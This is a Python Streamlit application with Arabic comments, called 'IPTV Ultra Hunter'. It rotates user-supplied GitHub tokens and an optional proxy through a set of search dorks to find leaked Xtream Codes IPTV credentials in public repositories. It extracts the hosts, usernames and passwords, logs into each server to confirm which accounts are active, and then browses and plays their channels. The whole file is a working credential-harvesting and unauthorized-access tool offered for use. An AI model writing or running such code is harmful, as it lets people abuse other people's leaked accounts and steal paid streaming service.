import streamlit as st
import requests
import re
import time
import hashlib
from datetime import datetime

# إعدادات
REQUEST_TIMEOUT = 5
PAGES_PER_STEP = 1   # صفحة واحدة لكل خطوة للحفاظ على السرعة
MAX_PAGES = 30       # أقصى عدد صفحات لكل دورك

st.set_page_config(page_title="IPTV Ultra Hunter", layout="wide", page_icon="📡")
st.markdown("""
<style>
    .server-card { background-color: #1e1e1e; padding: 10px; border-radius: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
    .server-card:hover { background-color: #2a2a2a; border-left: 4px solid #00ff88; }
    .channel-item { padding: 5px; border-bottom: 1px solid #333; cursor: pointer; transition: 0.1s; }
    .channel-item:hover { background-color: #2a2a2a; }
    .active-server { border-left: 4px solid #00ff88; background-color: #252525; }
    .stVideo { border-radius: 12px; }
</style>
""", unsafe_allow_html=True)

# تهيئة session_state
defaults = {
    "step": 0, "accounts": [], "servers": [], "channels_cache": {},
    "current_server": None, "current_channels": [], "searching": False,
    "log": [], "tokens": [], "proxy": "", "unique_set": set(),
    "dork_list": [
        '"player_api.php?username="', '"get.php?username="', 'filename:m3u "xtream"',
        '"/player_api.php" password', 'xtreamcodes "username" "password"',
        'inurl:player_api.php?username=', 'inurl:get.php?username=',
        '"xtream" filename:config', '"enigma2" user pass', '"streaming" username password m3u'
    ],
    "current_dork_idx": 0, "current_token_idx": 0, "current_page": 1,
    "selected_channel_id": None, "selected_server_idx": None
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v

# دوال مساعدة
def extract_xtream_accounts(content):
    pattern = r'(https?://[a-zA-Z0-9.-]+:\d+)/(?:player_api|get)\.php\?(?:username|user)=([^&\s]+)&(?:password|pass)=([^&\s]+)'
    return re.findall(pattern, content, re.IGNORECASE)

def check_account(host, user, pw, proxy):
    try:
        api = f"{host}/player_api.php?username={user}&password={pw}"
        proxies = {"http": proxy, "https": proxy} if proxy else None
        r = requests.get(api, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if r.status_code != 200: return None
        data = r.json()
        if data.get("user_info", {}).get("status") == "Active":
            exp = data["user_info"].get('exp_date')
            exp_str = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d') if exp else "دائم"
            return {"host": host, "user": user, "pass": pw, "exp": exp_str}
    except: return None
    return None

def search_github(dork, token, page, proxy):
    url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if resp.status_code == 200: return resp.json().get('items', [])
        elif resp.status_code == 403: time.sleep(30)
    except: pass
    return []

def process_raw(raw_url, proxy):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = requests.get(raw_url, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if resp.status_code != 200: return []
        return extract_xtream_accounts(resp.text)
    except: return []

def load_channels(server, proxy):
    try:
        url = f"{server['host']}/player_api.php?username={server['user']}&password={server['pass']}&action=get_live_streams"
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = requests.get(url, timeout=10, proxies=proxies)
        if resp.status_code == 200:
            ch = resp.json()
            if isinstance(ch, list): return ch
    except: pass
    return []

# ========== واجهة جانبية ==========
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/iptv.png", width=60)
    st.title("⚙️ IPTV Hunter")
    tokens_input = st.text_area("🔑 GitHub Tokens (سطر لكل توكن)", placeholder="ghp_token1\nghp_token2")
    proxy_input = st.text_input("🌐 بروكسي (اختياري)", placeholder="http://user:pass@ip:port")
    col1, col2 = st.columns(2)
    if col1.button("🚀 بدء الصيد", use_container_width=True, type="primary"):
        if not tokens_input.strip():
            st.error("أدخل GitHub Tokens")
        else:
            st.session_state.searching = True
            st.session_state.accounts = []
            st.session_state.servers = []
            st.session_state.log = []
            st.session_state.unique_set = set()
            st.session_state.current_dork_idx = 0
            st.session_state.current_token_idx = 0
            st.session_state.current_page = 1
            st.session_state.tokens = [t.strip() for t in tokens_input.splitlines() if t.strip()]
            st.session_state.proxy = proxy_input if proxy_input else None
            st.session_state.log.append(f"🚀 بدء البحث - {len(st.session_state.tokens)} توكن، {len(st.session_state.dork_list)} دورك")
            st.rerun()
    if col2.button("⏹️ إيقاف الصيد", use_container_width=True):
        st.session_state.searching = False
        st.session_state.log.append("⏸️ تم إيقاف البحث")
        st.rerun()
    st.markdown("---")
    st.metric("💎 الحسابات الشغالة", len(st.session_state.accounts))
    st.metric("🗄️ الخوادم النشطة", len(st.session_state.servers))
    st.markdown("---")
    st.subheader("📋 سجل العمليات")
    log_area = st.container(height=200)
    for msg in st.session_state.log[:20]:
        log_area.text(msg)

# ========== تنفيذ البحث خطوة بخطوة ==========
if st.session_state.searching:
    tokens = st.session_state.tokens
    dorks = st.session_state.dork_list
    dork_idx = st.session_state.current_dork_idx
    token_idx = st.session_state.current_token_idx
    page = st.session_state.current_page
    proxy = st.session_state.proxy

    # إعادة تدوير المؤشرات
    if token_idx >= len(tokens):
        token_idx = 0
        dork_idx += 1
        if dork_idx >= len(dorks):
            dork_idx = 0
            st.session_state.log.append("🔄 بدأ دورة بحث جديدة")
        st.session_state.current_token_idx = token_idx
        st.session_state.current_dork_idx = dork_idx
        st.session_state.current_page = 1
        st.rerun()

    token = tokens[token_idx]
    dork = dorks[dork_idx]
    progress_text = st.empty()
    progress_bar = st.progress(0)
    progress_text.text(f"🔍 البحث: {dork[:30]} | صفحة {page} | توكن {token[:6]}...")
    progress_bar.progress(min(1.0, (token_idx + dork_idx * 0.1) / (len(tokens) * len(dorks))))

    items = search_github(dork, token, page, proxy)
    if items:
        for item in items:
            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            accounts_raw = process_raw(raw_url, proxy)
            for host, user, pw in accounts_raw:
                uid = hashlib.md5(f"{host}{user}{pw}".encode()).hexdigest()
                if uid in st.session_state.unique_set: continue
                st.session_state.unique_set.add(uid)
                checked = check_account(host, user, pw, proxy)
                if checked:
                    st.session_state.accounts.append(checked)
                    if not any(s['host'] == checked['host'] for s in st.session_state.servers):
                        st.session_state.servers.append(checked)
                    st.session_state.log.insert(0, f"✅ شغال: {checked['host']} | {checked['user']} (انتهاء {checked['exp']})")
                    if len(st.session_state.log) > 50: st.session_state.log = st.session_state.log[:50]
        st.session_state.current_page += 1
        if st.session_state.current_page > MAX_PAGES:
            st.session_state.current_page = 1
            st.session_state.current_token_idx += 1
    else:
        st.session_state.current_token_idx += 1
        st.session_state.current_page = 1

    st.session_state.log.insert(0, f"⏳ تم فحص {len(st.session_state.unique_set)} رابط")
    time.sleep(0.6)
    st.rerun()

# ========== تصميم الأعمدة الرئيسية ==========
st.title("📡 IPTV Ultra Hunter Pro")
st.markdown("---")

col_servers, col_channels, col_player = st.columns([1.2, 2, 2.5])

# ========== قائمة السيرفرات (بطاقة أنيقة) ==========
with col_servers:
    st.subheader("🗄️ خوادم Xtream النشطة")
    if st.session_state.servers:
        for idx, srv in enumerate(st.session_state.servers):
            active_class = "active-server" if st.session_state.selected_server_idx == idx else ""
            with st.container():
                st.markdown(f"""
                <div class='server-card {active_class}' id='server_{idx}'>
                    <b>🌐 {srv['host']}</b><br>
                    👤 {srv['user']}<br>
                    📅 {srv['exp']}
                </div>
                """, unsafe_allow_html=True)
                if st.button(f"اختيار", key=f"sel_{idx}", use_container_width=True):
                    st.session_state.selected_server_idx = idx
                    st.session_state.current_server = srv
                    key = f"{srv['host']}|{srv['user']}"
                    if key in st.session_state.channels_cache:
                        st.session_state.current_channels = st.session_state.channels_cache[key]
                    else:
                        with st.spinner("تحميل القنوات..."):
                            ch = load_channels(srv, st.session_state.proxy)
                            st.session_state.channels_cache[key] = ch
                            st.session_state.current_channels = ch
                    st.session_state.selected_channel_id = None
                    st.rerun()
    else:
        st.info("لا توجد خوادم بعد. ابدأ البحث.")

# ========== قائمة القنوات الطويلة (قابلة للبحث) ==========
with col_channels:
    st.subheader("📺 قنوات السيرفر المختار")
    if st.session_state.current_server:
        st.write(f"**{st.session_state.current_server['host']}** - {st.session_state.current_server['user']}")
        search_ch = st.text_input("🔍 بحث في القنوات", placeholder="اسم القناة...")
        if st.session_state.current_channels:
            filtered = [c for c in st.session_state.current_channels if search_ch.lower() in c['name'].lower()] if search_ch else st.session_state.current_channels
            # عرض القنوات في قائمة طويلة قابلة للتمرير
            scroll_container = st.container(height=500)
            with scroll_container:
                for ch in filtered[:1000]:
                    ch_name = ch['name'][:60]
                    if st.button(f"📡 {ch_name} (ID:{ch['stream_id']})", key=f"ch_{ch['stream_id']}", use_container_width=True):
                        st.session_state.selected_channel_id = ch['stream_id']
                        st.rerun()
        else:
            st.warning("لا توجد قنوات لهذا الخادم")
    else:
        st.info("اختر خادماً من القائمة اليسرى")

# ========== مشغل ويب متقدم ==========
with col_player:
    st.subheader("🎬 مشغل فيديو متقدم")
    if st.session_state.selected_channel_id and st.session_state.current_server:
        srv = st.session_state.current_server
        # خيارات الجودة والصيغة
        col_q1, col_q2 = st.columns(2)
        with col_q1:
            quality = st.selectbox("جودة البث", ["أصلية (TS)", "HLS (M3U8)", "720p", "480p", "360p", "240p", "144p", "96p"], index=0)
        with col_q2:
            ext = st.selectbox("الصيغة", ["ts", "m3u8"], index=0)
            if ext == "m3u8":
                quality = "HLS (M3U8)"  # قوة override لضمان التوافق

        # بناء الرابط
        base_url = f"{srv['host']}/live/{srv['user']}/{srv['pass']}/{st.session_state.selected_channel_id}.{ext}"
        bitrate_map = {"720p": "720", "480p": "480", "360p": "360", "240p": "240", "144p": "144", "96p": "96"}
        if quality in bitrate_map:
            base_url += f"?bitrate={bitrate_map[quality]}"

        st.caption(f"رابط البث: `{base_url[:80]}...`")

        if ext == "m3u8":
            st.components.v1.html(f"""
            <video id="video_player" controls autoplay width="100%" height="auto" style="border-radius:12px;"></video>
            <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
            <script>
                var video = document.getElementById('video_player');
                if (Hls.isSupported()) {{
                    var hls = new Hls();
                    hls.loadSource('{base_url}');
                    hls.attachMedia(video);
                    hls.on(Hls.Events.MANIFEST_PARSED, function() {{ video.play(); }});
                }}
            </script>
            """, height=400)
        else:
            st.video(base_url)
    else:
        st.warning("اختر خادماً ثم قناة من القائمة")

# زر نسخ الرابط للمشاركة
if st.session_state.selected_channel_id and st.session_state.current_server:
    if st.button("📋 نسخ رابط البث", use_container_width=True):
        st.write("تم نسخ الرابط إلى الحافظة (يمكنك استخدامه في VLC)")
        st.code(base_url)
